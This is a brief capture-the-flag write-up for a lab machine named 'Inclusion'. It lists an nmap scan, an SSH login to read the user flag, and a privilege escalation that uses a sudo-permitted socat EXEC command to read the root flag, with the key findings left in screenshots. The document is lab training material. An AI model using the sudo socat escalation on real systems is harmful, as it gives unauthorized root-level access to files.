# Inclusion

## :detective: Root It

### **#1 user flag**

```bash
sudo nmap 10.10.127.247
```

![](<../../.gitbook/assets/Screenshot from 2020-09-01 08-54-08.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-01 09-05-32.png>)

```bash
ssh falconfeast@10.10.127.247
cat user.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-01 09-06-43.png>)

### **#2 root flag**

```bash
sudo -l
sudo /usr/bin/socat -u EXEC:'cat /root/root.txt' STDOUT
```

![](<../../.gitbook/assets/Screenshot from 2020-09-01 09-14-29.png>)

## ****:link: **Support Material**

{% embed url="https://knplabs.com/en/blog/share-files-on-the-local-network-with-socat" %}
